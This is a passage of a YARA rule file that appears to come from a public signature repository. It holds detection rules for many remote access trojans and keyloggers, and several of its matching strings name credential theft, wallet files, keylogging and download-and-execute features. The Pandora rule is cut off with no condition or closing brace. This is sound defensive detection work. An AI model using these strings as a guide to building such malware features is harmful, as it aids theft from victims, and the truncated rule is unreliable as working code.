		filetype = "exe"

	strings:
		$a = "Hashtable"
		$b = "get_IsDisposed"
		$c = "TripleDES"
		$d = "testmemory.FRMMain.resources"
		$e = "$this.Icon" wide
		$f = "{11111-22222-20001-00001}" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Adzok
{
	meta:
		description = "Detects Adzok RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "93807f85-ae4e-5fd2-9010-ed2cf6f57f38"
		date = "2015-01-05"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Adzok"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L24-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ee3291a4396ba6cb3c5e22229de4f5e45714b29bfeac1c56bde6d038a9d25458"
		score = 75
		quality = 85
		tags = ""
		Versions = "Free 1.0.0.3,"
		maltype = "Remote Access Trojan"
		filetype = "jar"

	strings:
		$a1 = "config.xmlPK"
		$a2 = "key.classPK"
		$a3 = "svd$1.classPK"
		$a4 = "svd$2.classPK"
		$a5 = "Mensaje.classPK"
		$a6 = "inic$ShutdownHook.class"
		$a7 = "Uninstall.jarPK"
		$a8 = "resources/icono.pngPK"

	condition:
		7 of ( $a* )
}

rule SIGNATURE_BASE_RAT_Ap0Calypse
{
	meta:
		description = "Detects Ap0calypse RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "a2993654-efa0-519b-b6f6-4d722d93adde"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Ap0calypse"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L50-L71"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1ce90a5b1b3f643d4e530d6e00741f5d5918d3199cfbc4126cf8421a9e42023e"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "Ap0calypse"
		$b = "Sifre"
		$c = "MsgGoster"
		$d = "Baslik"
		$e = "Dosyalars"
		$f = "Injecsiyon"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Arcom
{
	meta:
		description = "Detects Arcom RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "a0598340-c4a5-53f0-a810-63e37ec669a5"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Arcom"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L72-L93"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "dbccd9885ba0ec5741e3c74908d2e76b15836bc75373c100f344abf9bdf3a0b4"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a1 = "CVu3388fnek3W(3ij3fkp0930di"
		$a2 = "ZINGAWI2"
		$a3 = "clWebLightGoldenrodYellow"
		$a4 = "Ancestor for '%s' not found" wide
		$a5 = "Control-C hit" wide
		$a6 = {A3 24 25 21}

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Bandook
{
	meta:
		description = "Detects Bandook RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "79fb99d8-bd56-5986-9917-e119b51b8303"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/bandook"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L95-L120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "fe658e0990f0d456b1a8f5acea62a3b80bdd4a9bc0eedfe2e1092ea60b4fca2e"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "aaaaaa1|"
		$b = "aaaaaa2|"
		$c = "aaaaaa3|"
		$d = "aaaaaa4|"
		$e = "aaaaaa5|"
		$f = "%s%d.exe"
		$g = "astalavista"
		$h = "givemecache"
		$i = "%s\\system32\\drivers\\blogs\\*"
		$j = "bndk13me"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Blacknix
{
	meta:
		description = "Detects BlackNix RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "d7814184-3ae4-53f1-a602-c3fbc02573c3"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/BlackNix"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L122-L142"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "de8787fd35e6313c061b8759361698b1acd54b215d226839a8702b1a5d189ccb"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a1 = "SETTINGS" wide
		$a2 = "Mark Adler"
		$a3 = "Random-Number-Here"
		$a4 = "RemoteShell"
		$a5 = "SystemInfo"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Bluebanana
{
	meta:
		description = "Detects BlueBanana RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "f00c7e92-f34c-5666-a1d9-02ac2cf7608c"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/BlueBanana"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L163-L184"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0d84bb63d56d876c8b2e7c8c8afeaba839fee41d2d38f16ac9a13e802008179e"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "Java"

	strings:
		$meta = "META-INF"
		$conf = "config.txt"
		$a = "a/a/a/a/f.class"
		$b = "a/a/a/a/l.class"
		$c = "a/a/a/b/q.class"
		$d = "a/a/a/b/v.class"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Bozok
{
	meta:
		description = "Detects Bozok RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "b1d22e8c-39aa-52e7-9ca8-2b35bb82f7de"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Bozok"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L186-L206"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9a2fcd11573654f0c91c0c0dec8938ca8319a23953a5043135cb0032562f9f53"
		score = 75
		quality = 75
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "getVer" nocase
		$b = "StartVNC" nocase
		$c = "SendCamList" nocase
		$d = "untPlugin" nocase
		$e = "gethostbyname" nocase

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Cybergate
{
	meta:
		description = "Detects CyberGate RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "387e7c89-c766-54cf-aac0-3ba03092bc25"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/CyberGate"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L230-L254"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6b3861ae5e6bd6478e9d8024b0e67a3ac1dbf31083b77477364c55b51d0ed9b5"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string1 = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}
		$string2 = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}
		$string3 = "EditSvr"
		$string4 = "TLoader"
		$string5 = "Stroks"
		$string6 = "####@####"
		$res1 = "XX-XX-XX-XX"
		$res2 = "CG-CG-CG-CG"

	condition:
		all of ( $string* ) and any of ( $res* )
}

rule SIGNATURE_BASE_RAT_Darkcomet
{
	meta:
		description = "Detects DarkComet RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "e6fd0269-dd0c-58c0-a1a3-24c2aed916ee"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/DarkComet"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L256-L282"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "db139f754f89affc706e090a41bfcd30cf49f9d4e16ade89993ee170f92cf68b"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a1 = "#BOT#URLUpdate"
		$a2 = "Command successfully executed!"
		$a3 = "MUTEXNAME" wide
		$a4 = "NETDATA" wide
		$b1 = "FastMM Borland Edition"
		$b2 = "%s, ClassID: %s"
		$b3 = "I wasn't able to open the hosts file"
		$b4 = "#BOT#VisitUrl"
		$b5 = "#KCMDDC"

	condition:
		all of ( $a* ) or all of ( $b* )
}

rule SIGNATURE_BASE_RAT_Darkrat
{
	meta:
		description = "Detects DarkRAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "8283236a-6ed1-5213-8386-a029867b9677"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/DarkRAT"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L284-L306"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "dccb473a3cf4478dd1dbf8b35ad564f59740676ecde90266a0dc15cbad89bfe7"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "@1906dark1996coder@"
		$b = "SHEmptyRecycleBinA"
		$c = "mciSendStringA"
		$d = "add_Shutdown"
		$e = "get_SaveMySettingsOnExit"
		$f = "get_SpecialDirectories"
		$g = "Client.My"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Greame
{
	meta:
		description = "Detects Greame RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "b90d3747-407a-5552-971f-78ff78f827a6"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Greame"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L308-L331"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4a1ce5f5847bdc01d286c1d9cd1e16ba2fd6b5bc56e6094cb1492882708e8e59"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}
		$b = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}
		$c = "EditSvr"
		$d = "TLoader"
		$e = "Stroks"
		$f = "Avenger by NhT"
		$g = "####@####"
		$h = "GREAME"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Hawkeye
{
	meta:
		description = "Detects HawkEye RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "22b1d1e6-feea-5f84-9564-326ad80bbd8d"
		date = "2015-01-06"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/HawkEye"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L333-L357"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "db3a0fe5774f0d137e092a4eb9672a4518d0ef943a1a4619cb646a9ac9f74ee0"
		score = 75
		quality = 85
		tags = ""
		maltype = "KeyLogger"
		filetype = "exe"

	strings:
		$key = "HawkEyeKeylogger" wide
		$salt = "099u787978786" wide
		$string1 = "HawkEye_Keylogger" wide
		$string2 = "holdermail.txt" wide
		$string3 = "wallet.dat" wide
		$string4 = "Keylog Records" wide
		$string5 = "<!-- do not script -->" wide
		$string6 = "\\pidloc.txt" wide
		$string7 = "BSPLIT" wide

	condition:
		$key and $salt and all of ( $string* )
}

rule SIGNATURE_BASE_RAT_Imminent
{
	meta:
		description = "Detects Imminent RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "deddef60-c309-54e0-a488-ce937ed7eae3"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Imminent"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L359-L389"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "aebae753c119950b0b3f315c7279866caf15f4d482c0a47912c90885adcf6db2"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$v1a = "DecodeProductKey"
		$v1b = "StartHTTPFlood"
		$v1c = "CodeKey"
		$v1d = "MESSAGEBOX"
		$v1e = "GetFilezillaPasswords"
		$v1f = "DataIn"
		$v1g = "UDPzSockets"
		$v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}
		$v2a = "<URL>k__BackingField"
		$v2b = "<RunHidden>k__BackingField"
		$v2c = "DownloadAndExecute"
		$v2d = "-CHECK & PING -n 2 127.0.0.1 & EXIT" wide
		$v2e = "england.png" wide
		$v2f = "Showed Messagebox" wide

	condition:
		all of ( $v1* ) or all of ( $v2* )
}

rule SIGNATURE_BASE_RAT_Infinity
{
	meta:
		description = "Detects Infinity RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "b70f9459-fa84-516f-841d-d9617856eb4d"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Infinity"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L391-L414"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c1f5381755af6cfbb10a4769757cdeffb9651bddc76bc4c8e9765ed44bf37fe6"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "CRYPTPROTECT_PROMPTSTRUCT"
		$b = "discomouse"
		$c = "GetDeepInfo"
		$d = "AES_Encrypt"
		$e = "StartUDPFlood"
		$f = "BATScripting" wide
		$g = "FBqINhRdpgnqATxJ.html" wide
		$i = "magic_key" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Lostdoor
{
	meta:
		description = "Detects LostDoor RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "f86ae7a1-2182-5b2e-8f9e-9e8456f574bc"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/LostDoor"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L440-L465"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7ffa6f5cbeacca5a1e750e35d8296658d4e280078a61f94fd5f2d4b7c800bb44"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}
		$a1 = "*mlt* = %"
		$a2 = "*ip* = %"
		$a3 = "*victimo* = %"
		$a4 = "*name* = %"
		$b5 = "[START]"
		$b6 = "[DATA]"
		$b7 = "We Control Your Digital World" wide ascii
		$b8 = "RC4Initialize" wide ascii
		$b9 = "RC4Decrypt" wide ascii

	condition:
		all of ( $a* ) or all of ( $b* )
}

rule SIGNATURE_BASE_RAT_Luminositylink
{
	meta:
		description = "Detects LuminosityLink RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "163fe10c-38a1-53d3-b3a5-4240229e0306"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/LuminosityLink"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L467-L493"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5e70e3e0885d098f1ac2bcc324cd8ad2682fbfc395f189cabc4a4f97a0109682"
		score = 75
		quality = 60
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "SMARTLOGS" wide
		$b = "RUNPE" wide
		$c = "b.Resources" wide
		$d = "CLIENTINFO*" wide
		$e = "Invalid Webcam Driver Download URL, or Failed to Download File!" wide
		$f = "Proactive Anti-Malware has been manually activated!" wide
		$g = "REMOVEGUARD" wide
		$h = "C0n1f8" wide
		$i = "Luminosity" wide
		$j = "LuminosityCryptoMiner" wide
		$k = "MANAGER*CLIENTDETAILS*" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Luxnet
{
	meta:
		description = "Detects LuxNet RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "277db509-5ba0-5d1b-b17a-d5914f1f1650"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/LuxNet"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L495-L516"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "55d872e2e30f6d55a6f91750bbb52675042e4673d712a4f2417af43b0f2c4fb9"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "GetHashCode"
		$b = "Activator"
		$c = "WebClient"
		$d = "op_Equality"
		$e = "dickcursor.cur" wide
		$f = "{0}|{1}|{2}" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Netwire
{
	meta:
		description = "Detects NetWire RAT"
		author = "Kevin Breen <kevin@techanarchy.net> & David Cannings"
		id = "f0077e8c-3e6a-5a98-9171-b0d81f24d27a"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/NetWire"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L547-L569"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6a4e757262c02dfe46ac28940b53a5695df2d242ccd4c16b42fbfdcf96072e91"
		score = 75
		quality = 60
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$exe1 = "%.2d-%.2d-%.4d"
		$exe2 = "%s%.2d-%.2d-%.4d"
		$exe3 = "[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]"
		$exe4 = "wcnwClass"
		$exe5 = "[Ctrl+%c]"
		$exe6 = "SYSTEM\\CurrentControlSet\\Control\\ProductOptions"
		$exe7 = "%s\\.purple\\accounts.xml"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Pandora
{
	meta:
		description = "Detects Pandora RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "d31e4366-8911-5c9c-92dc-a99f5233c626"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Pandora"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L571-L599"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d33598d0699bfb7e996047318099302c2c326e45d993a259c2bc145acf8cf54b"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "Can't get the Windows version"
		$b = "=M=Q=U=Y=]=a=e=i=m=q=u=y=}="

rule SIGNATURE_BASE_RAT_Paradox
{
	meta:
		description = "Detects Paradox RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "2f1e6226-799b-54eb-a4a4-6c0f1bf561b4"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Paradox"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L601-L623"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "fef41262b78a497c65c7548c58d78ba8912725b28606fd9e99d1dbc19bdf7393"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "ParadoxRAT"
		$b = "Form1"
		$c = "StartRMCam"
		$d = "Flooders"
		$e = "SlowLaris"
		$f = "SHITEMID"
		$g = "set_Remote_Chat"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Plasma
{
	meta:
		description = "Detects Plasma RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "2a19c0de-0078-5487-869c-1bcabea57300"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Plasma"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L625-L649"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e73348d379c483a7917cf765a457739aed6940f180272fa8d0c0dd1eb8e5f562"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "Miner: Failed to Inject." wide
		$b = "Started GPU Mining on:" wide
		$c = "BK: Hard Bot Killer Ran Successfully!" wide
		$d = "Uploaded Keylogs Successfully!" wide
		$e = "No Slowloris Attack is Running!" wide
		$f = "An ARME Attack is Already Running on" wide
		$g = "Proactive Bot Killer Enabled!" wide
		$h = "PlasmaRAT" wide ascii
		$i = "AntiEverything" wide ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Poisonivy
{
	meta:
		description = "Detects PoisonIvy RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "371686d3-878f-56fc-a702-ec49845f486b"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/PoisonIvy"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L651-L672"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "874e0dfb22a03abc0f7fdc7209ff13b55dfa5dcc17db944903ca37a549eb331d"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}
		$string1 = "CONNECT %s:%i HTTP/1.0"
		$string2 = "ws2_32"
		$string3 = "cks=u"
		$string4 = "thj@h"
		$string5 = "advpack"

	condition:
		$stub at 0x1620 and all of ( $string* ) or ( all of them )
}

rule SIGNATURE_BASE_RAT_Predatorpain
{
	meta:
		description = "Detects PredatorPain RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "c6670179-871d-5a57-983b-d77354e2ede9"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/PredatorPain"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L674-L702"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "917234f83f891ad00bd83908c244818f517ea89cf7d8c81cfc3618b8386c1804"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string1 = "holderwb.txt" wide
		$string3 = "There is a file attached to this email" wide
		$string4 = "screens\\screenshot" wide
		$string5 = "Disablelogger" wide
		$string6 = "\\pidloc.txt" wide
		$string7 = "clearie" wide
		$string8 = "clearff" wide
		$string9 = "emails should be sent to you shortly" wide
		$string10 = "jagex_cache\\regPin" wide
		$string11 = "open=Sys.exe" wide
		$ver1 = "PredatorLogger" wide
		$ver2 = "EncryptedCredentials" wide
		$ver3 = "Predator Pain" wide

	condition:
		7 of ( $string* ) and any of ( $ver* )
}

rule SIGNATURE_BASE_RAT_Punisher
{
	meta:
		description = "Detects Punisher RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "1e16b3c7-9656-5570-afa2-542367aa14d8"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Punisher"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L704-L726"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9347b8053393c3537693273c44a2a2f095928b8bc0cdcf9365a6f060d66efeb5"
		score = 75
		quality = 60
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "abccba"
		$b = {5C 00 68 00 66 00 68 00 2E 00 76 00 62 00 73}
		$c = {5C 00 73 00 63 00 2E 00 76 00 62 00 73}
		$d = "SpyTheSpy" wide ascii
		$e = "wireshark" wide
		$f = "apateDNS" wide
		$g = "abccbaDanabccb"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Pythorat
{
	meta:
		description = "Detects Python RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "fc98c513-1abf-5331-b351-f6182e5b19c5"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/PythoRAT"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L728-L751"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8edcfb8f234ff225537d19343c75788ec2a25940e80042751eea3280a967e166"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "TKeylogger"
		$b = "uFileTransfer"
		$c = "TTDownload"
		$d = "SETTINGS"
		$e = "Unknown" wide
		$f = "#@#@#"
		$g = "PluginData"
		$i = "OnPluginMessage"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Qrat
{
	meta:
		description = "Detects QRAT"
		author = "Kevin Breen @KevTheHermit"
		id = "2ee645a3-1e01-513c-a636-098e445adeca"
		date = "2015-01-08"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L753-L773"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6d404153ca64b547885e4e4581205f5fc20faf86e8ab18002c5deedca2487225"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "jar"

	strings:
		$a0 = "e-data"
		$a1 = "quaverse/crypter"
		$a2 = "Qrypt.class"
		$a3 = "Jarizer.class"
		$a4 = "URLConnection.class"

	condition:
		4 of them
}

rule SIGNATURE_BASE_RAT_Smallnet
{
	meta:
		description = "Detects SmallNet RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "aec1f8fd-2806-527e-9d50-422f212864de"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/SmallNet"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L841-L861"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
